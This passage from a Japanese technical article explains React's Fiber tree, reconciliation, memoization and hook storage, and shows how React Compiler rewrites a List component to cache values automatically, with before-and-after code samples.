    <span class="token keyword">return</span> <span class="token punctuation">(</span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span><span class="token punctuation">{</span> listItems <span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>
    <span class="token punctuation">)</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>これらの関数は、子（ここでは最終的に複数のliオブジェクトになる）を含むulオブジェクトのようなプレーンなJavaScriptオブジェクトを返します。ulやliなどの一部のオブジェクトはReactに組み込まれています。Listなど、それ以外のオブジェクトは自分で作成します。</p>
<p>最終的に、Reactはこれらすべてのオブジェクトを使ってFiberツリーと呼ばれるものを構築します。ツリーの各ノードはFiber、またはFiberノードと呼ばれます。UIを説明するためにJavaScriptオブジェクトからなる独自のノードツリーを作成することを、「仮想DOM」を作成すると言います。</p>
<p><img src="https://anthonyalicea.com/assets/blogimages/ReactCompiler_FiberTree.png"></p>
<p>Reactでは、ツリーの各ノードから枝分かれする2本の枝があります。1つは"current"（DOMと一致）、もう1つは"work-in-progress"（関数を再実行した際に返された内容をもとに構築したツリーと一致）の枝（ツリー）です。</p>
<p><img src="https://anthonyalicea.com/assets/blogimages/ReactCompiler_Reconciliation.png"></p>
<p>Reactはこれら2つのツリーを比較した上で、DOMがwork-in-progress側のツリーと一致するように実際のDOMに対して行う変更を判断します。このプロセスを「差分検出処理（reconciliation）」と呼びます。</p>
<p>したがって、他にどのような機能をアプリに追加するかによっては、ReactはUIの更新が必要だと判断するたびに<code class="language-text">List</code>関数を繰り返し呼び出すかもしれません。そうするとメンタルモデルはかなり分かりやすくなります。UIの更新が必要な場合（例えば、ユーザーがボタンをクリックした場合など）、UIを定義する関数が再び呼び出され、Reactは関数が定義するUIの外観と一致するように、ブラウザ上で実際のDOMをどう更新するかを判断します。</p>
<p>しかし、<code class="language-text">processItems</code>関数が遅いと、<code class="language-text">List</code>を呼び出すコールも遅くなり、アプリ全体の反応が遅くなってしまいます。</p>
<h2>メモ化</h2>
<p>パフォーマンスコストの高い関数を繰り返し呼び出す必要がある場合、プログラミングによる解決策として、関数の結果をキャッシュします。このプロセスを「メモ化」と呼びます。</p>
<p>メモ化が機能するためには、関数が「純粋」でなくてはなりません。つまり、関数に同じ入力値を渡した場合、毎回同じ出力が得られなくてはならないということです。出力が毎回同じであれば、入力値と関連付けた形で出力を保存することができます。</p>
<p>次にそのパフォーマンスコストの高い関数を呼び出した際には、入力値を見て、同じ入力値の関数をすでに実行済みかをキャッシュで確認します。すでに実行していれば、再度その関数を呼び出すのではなく、キャッシュに保存された出力を取得します。前回その入力値が使用されたときと出力が同じであることが分かっているので、再度関数を呼び出す必要はありません。</p>
<p>前述のコード例で使用した<code class="language-text">processItems</code>関数がメモ化を実装した場合、次のようになります。</p>
<div class="gatsby-highlight" data-language="js"><pre style="counter-reset: linenumber NaN" class="language-js line-numbers"><code class="language-js"><span class="token keyword">function</span> <span class="token function">processItems</span><span class="token punctuation">(</span><span class="token parameter">items</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> memOutput <span class="token operator">=</span> <span class="token function">getItemsOutput</span><span class="token punctuation">(</span>items<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>memOutput<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> memOutput<span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token comment">// ...run expensive processing</span>
        <span class="token function">saveItemsOutput</span><span class="token punctuation">(</span>items<span class="token punctuation">,</span> output<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> output<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p><code class="language-text">saveItemsOutput</code>関数は、アイテムと、この関数と関連する出力の両方を保存するオブジェクトを格納するものだと考えてください。<code class="language-text">getItemsOutput</code>は、<code class="language-text">item</code>がすでに保存されているかを確認し、保存されていればそれ以上の作業は行わず、キャッシュに保存された関連する出力を返します。</p>
<p>関数を繰り返し呼び出すReactのアーキテクチャにとって、メモ化はアプリの動作が遅くならないようにするための重要な技術です。</p>
<h2>Hooksの保存</h2>
<p>React Compilerを理解するために理解する必要のあるReactのアーキテクチャがもう1つあります。</p>
<p>アプリの「state」（UIの作成に必要なデータ）が変わると、Reactは再度関数を呼び出す必要があるか判断します。例えば、値がtrueかfalseである"showButton"というデータの場合、このデータの値に応じて、UIはボタンを表示するか、非表示にする必要があります。</p>
<p>Reactはクライアントのデバイス上にstateを保存します。どうやって保存するのでしょうか。いくつかのアイテムをレンダリングし、操作するReactアプリを例に見てみましょう。最終的に選択されたアイテムを保存し、アイテムをクライアント側でレンダリングし、イベントを処理し、リストをソートすると仮定します。アプリは次のようになります。</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// TODO: fetch some items here</span>
    <span class="token keyword">return</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">List</span></span> <span class="token attr-name">items</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>items<span class="token punctuation">}</span></span> <span class="token punctuation">/></span></span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">List</span><span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">{</span> items <span class="token punctuation">}</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> <span class="token punctuation">[</span>selItem<span class="token punctuation">,</span> setSelItem<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token punctuation">[</span>itemEvent<span class="token punctuation">,</span> dispatcher<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useReducer</span><span class="token punctuation">(</span>reducer<span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token punctuation">[</span>sort<span class="token punctuation">,</span> setSort<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">const</span> pItems <span class="token operator">=</span> <span class="token function">processItems</span><span class="token punctuation">(</span>items<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> listItems <span class="token operator">=</span> pItems<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token punctuation">{</span> item <span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span><span class="token punctuation">{</span> listItems <span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>
    <span class="token punctuation">)</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>JavaScriptエンジンが<code class="language-text">useState</code>と<code class="language-text">useReducer</code>の行を実行した際、何が起きるでしょうか。<code class="language-text">List</code>コンポーネントをもとに作成したFiberツリーのノードには、データを保存するためのJavaScriptオブジェクトがいくつか追加されています。各オブジェクトは互いに連結し、連結リストと呼ばれるデータ構造になっています。</p>
<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p>多くの開発者は、<code class="language-text">useState</code>がReactにおけるstate管理の肝だと考えていますが、そうではありません。これは単に、<code class="language-text">useReducer</code>を呼び出すコールのラッパーです。</p></div></div>
<p><video controls src="/static.mp4" title="Title"></video></p>
<p><code class="language-text">useState</code>と<code class="language-text">useReducer</code>を呼び出すと、ReactはstateをFiberツリーに付け加え、アプリが実行されている間、これらは保持されます。したがって、関数が繰り返し再実行される間、stateはいつでも利用できる状態にあります。</p>
<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p>Hooksの保存方法は、Hooksをループまたはif文の中で呼び出せないという「Hooksのルール」の説明にもなります。Hooksを呼び出すたびに、Reactは連結リストの次のアイテムに移動します。したがって、Hooksを呼び出す回数は一貫している必要があります。一貫していないと、Reactは連結リストの中の間違ったアイテムを指す場合があります。</p></div></div>
<p>結局、Hooksはユーザーデバイスのメモリ上にデータ（および関数）を保存するオブジェクトに過ぎないのです。これは、React Compilerが実際に行う処理を理解する上で重要です。ただし、それだけではありません。</p>
<h2>Reactにおけるメモ化</h2>
<p>Reactは、メモ化の概念とHooksの保存の概念を組み合わせています。Fiberツリーの一部であり、Reactに渡すすべての関数（<code class="language-text">List</code>など）の結果をメモ化することも、それらの中で呼び出す個別の関数（<code class="language-text">processItems</code>など）をメモ化することもできます。</p>
<p>キャッシュは、stateと同じようにFiberツリー上に保存されます。例えば、<code class="language-text">useMemo</code>は<code class="language-text">useMemo</code>を呼び出すノード上に入力値と出力を保存します。</p>
<p>つまり、Reactにはパフォーマンスコストの高い関数の結果を、Fiberツリーの一部であるJavaScriptオブジェクトの連結リストに保存するという概念がすでに備わっているということです。これは素晴らしいことですが、1つ問題があります。メンテナンスです。</p>
<p>Reactにおけるメモ化は、メモ化が依存する入力値を明示的にReactに伝える必要があるため、面倒です。<code class="language-text">processItems</code>を呼び出すコールは次のようになります。</p>
<div class="gatsby-highlight" data-language="js"><pre style="counter-reset: linenumber NaN" class="language-js line-numbers"><code class="language-js"><span class="token keyword">const</span> pItems <span class="token operator">=</span> <span class="token function">useMemo</span><span class="token punctuation">(</span><span class="token function">processItems</span><span class="token punctuation">(</span>items<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>items<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>
<p>最後の配列は「依存関係」のリスト、すなわち変更されたらReactに再度関数を呼び出すよう指示する入力値です。これらの入力値が正しくないと、メモ化は正しく機能しません。事務的な雑務として維持し続ける必要があります。</p>
<h2>React Compiler</h2>
<p>ここでReact Compilerの登場です。React Compilerは、Reactコードのテキストを解析し、JSXのトランスパイルを行うための準備ができた新しいコードを生成するプログラムです。ただし、その新しいコードには追加された要素があります。</p>
<p>この場合、React Compilerがアプリに対してどのような処理を行うのか見てみましょう。以下はコンパイル前の状態です。</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// TODO: fetch some items here</span>
    <span class="token keyword">return</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">List</span></span> <span class="token attr-name">items</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>items<span class="token punctuation">}</span></span> <span class="token punctuation">/></span></span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">List</span><span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">{</span> items <span class="token punctuation">}</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> <span class="token punctuation">[</span>selItem<span class="token punctuation">,</span> setSelItem<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token punctuation">[</span>itemEvent<span class="token punctuation">,</span> dispatcher<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useReducer</span><span class="token punctuation">(</span>reducer<span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token punctuation">[</span>sort<span class="token punctuation">,</span> setSort<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">const</span> pItems <span class="token operator">=</span> <span class="token function">processItems</span><span class="token punctuation">(</span>items<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> listItems <span class="token operator">=</span> pItems<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token punctuation">{</span> item <span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span><span class="token punctuation">{</span> listItems <span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>
    <span class="token punctuation">)</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>コンパイル後は次のようになります。</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> $ <span class="token operator">=</span> <span class="token function">_c</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">let</span> t0<span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span>$<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">===</span> Symbol<span class="token punctuation">.</span><span class="token function">for</span><span class="token punctuation">(</span><span class="token string">"react.memo_cache_sentinel"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    t0 <span class="token operator">=</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">List</span></span> <span class="token attr-name">items</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>items<span class="token punctuation">}</span></span> <span class="token punctuation">/></span></span><span class="token punctuation">;</span>
    $<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> t0<span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    t0 <span class="token operator">=</span> $<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">return</span> t0<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">List</span><span class="token punctuation">(</span><span class="token parameter">t0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> $ <span class="token operator">=</span> <span class="token function">_c</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">const</span> <span class="token punctuation">{</span> items <span class="token punctuation">}</span> <span class="token operator">=</span> t0<span class="token punctuation">;</span>
  <span class="token function">useState</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">let</span> t1<span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span>$<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">===</span> Symbol<span class="token punctuation">.</span><span class="token function">for</span><span class="token punctuation">(</span><span class="token string">"react.memo_cache_sentinel"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    t1 <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    $<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> t1<span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    t1 <span class="token operator">=</span> $<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token function">useReducer</span><span class="token punctuation">(</span>reducer<span class="token punctuation">,</span> t1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">useState</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">let</span> t2<span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span>$<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!==</span> items<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> pItems <span class="token operator">=</span> <span class="token function">processItems</span><span class="token punctuation">(</span>items<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> t3<span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>$<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">===</span> Symbol<span class="token punctuation">.</span><span class="token function">for</span><span class="token punctuation">(</span><span class="token string">"react.memo_cache_sentinel"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function-variable function">t3</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token punctuation">{</span>item<span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token punctuation">;</span>

      $<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> t3<span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
      t3 <span class="token operator">=</span> $<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    t2 <span class="token operator">=</span> pItems<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>t3<span class="token punctuation">)</span><span class="token punctuation">;</span>
    $<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> items<span class="token punctuation">;</span>
    $<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> t2<span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    t2 <span class="token operator">=</span> $<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">const</span> listItems <span class="token operator">=</span> t2<span class="token punctuation">;</span>
  <span class="token keyword">let</span> t3<span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span>$<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">!==</span> listItems<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    t3 <span class="token operator">=</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span><span class="token punctuation">{</span>listItems<span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span><span class="token punctuation">;</span>
    $<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> listItems<span class="token punctuation">;</span>
    $<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> t3<span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    t3 <span class="token operator">=</span> $<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">return</span> t3<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>これが新しく書き直されたList関数です。かなりの情報量なので、少し分解して説明します。</p>
<p>冒頭に次の行があります。</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token keyword">const</span> $ <span class="token operator">=</span> <span class="token function">_c</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>
<p>この<code class="language-text">_c</code>関数（"c"は「キャッシュ」を表します）は、Hooksを使用して保存される配列を作成します。React Compilerは<code class="language-text">Link</code>関数を解析し、パフォーマンスを最大限に高めるには6つのものを保存する必要があると判断したのです。最初に関数が呼び出されたとき、その6つのものの結果を配列に保存します。</p>
<p>次に関数が呼び出されたときにはキャッシュが使われます。例として、<code class="language-text">processItems</code>を呼び出す部分を見てみましょう。</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token keyword">if</span> <span class="token punctuation">(</span>$<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!==</span> items<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> pItems <span class="token operator">=</span> <span class="token function">processItems</span><span class="token punctuation">(</span>items<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> t3<span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>$<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">===</span> Symbol<span class="token punctuation">.</span><span class="token function">for</span><span class="token punctuation">(</span><span class="token string">"react.memo_cache_sentinel"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function-variable function">t3</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token punctuation">{</span>item<span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token punctuation">;</span>
        $<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> t3<span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        t3 <span class="token operator">=</span> $<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    t2 <span class="token operator">=</span> pItems<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>t3<span class="token punctuation">)</span><span class="token punctuation">;</span>
    $<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> items<span class="token punctuation">;</span>
    $<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> t2<span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    t2 <span class="token operator">=</span> $<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>関数の呼び出しと<code class="language-text">li</code>の生成の両方を含む、<code class="language-text">processItems</code>に関するすべての処理がラップされた状態で、配列で2番目のキャッシュ（<code class="language-text">$[1]</code>）が、前回関数が呼び出されたときと同じ入力値かどうかを確認します（<code class="language-text">List</code>に渡される<code class="language-text">items</code>の値）。</p>
<p>同じであれば、キャッシュ配列で3番目の位置（<code class="language-text">$[2]</code>）が使われます。<code class="language-text">items</code>のマッピングが完了すると、生成されたすべての<code class="language-text">li</code>のリストが保存されます。React Compilerのコードはこう言っているのです。「前回この関数を呼び出したときと同じアイテムのリストを渡してくれたら、前回キャッシュに保存した<code class="language-text">li</code>のリストをあげます。」</p>
<p>前回と違う<code class="language-text">items</code>を渡すと、<code class="language-text">processItems</code>を呼び出します。その場合でも、リストの中の個々のアイテムについての情報をキャッシュに保存します。</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token keyword">if</span> <span class="token punctuation">(</span>$<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">===</span> Symbol<span class="token punctuation">.</span><span class="token function">for</span><span class="token punctuation">(</span><span class="token string">"react.memo_cache_sentinel"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function-variable function">t3</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token punctuation">{</span>item<span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token punctuation">;</span>
    $<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> t3<span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    t3 <span class="token operator">=</span> $<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p><code class="language-text">t3 = </code>の行をご覧ください。<code class="language-text">li</code>を返すアロー関数を再度作成するのではなく、キャッシュ配列で4番目の位置（<code class="language-text">$[3]</code>）に関数自体を保存しています。これにより、JavaScriptエンジンは次に<code class="language-text">List</code>が読み出されたときにこの関数を作成する必要がなくなります。この関数は決して変わることがないため、最初のif文は基本的にこう言っています。「キャッシュ配列のこの場所が空いているならキャッシュしてください。空いていなければキャッシュから取得してください。」</p>
<p>このようにして、Reactは自動的に値をキャッシュし、関数の結果をメモ化します。Reactが出力するコードは我々が書いたコードと機能は同じですが、これらの値をキャッシュするためのコードを含んでおり、Reactが繰り返し関数を呼び出すことでパフォーマンスが損なわれないようにしています。</p>
